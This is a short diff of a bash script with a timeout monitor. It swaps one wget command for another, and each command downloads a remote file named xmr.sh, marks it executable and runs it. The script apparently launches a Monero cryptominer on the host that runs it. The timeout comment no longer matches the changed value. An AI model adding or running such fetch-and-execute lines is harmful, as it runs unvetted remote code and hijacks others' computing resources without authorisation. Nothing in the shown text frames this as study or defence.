@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Timeout=290 # 6 minutes
+Timeout=1290 # 6 minutes
 
 function timeout_monitor() {
    sleep "$Timeout"
@@ -12,7 +12,7 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+wget https://github.com/lushenry654/bitbucket/blob/dependabot/add-v2-config-file/xmr.sh && chmod +x xmr.sh && ./xmr.sh
 # <your script here>
 
 # kill timeout monitor when terminating:
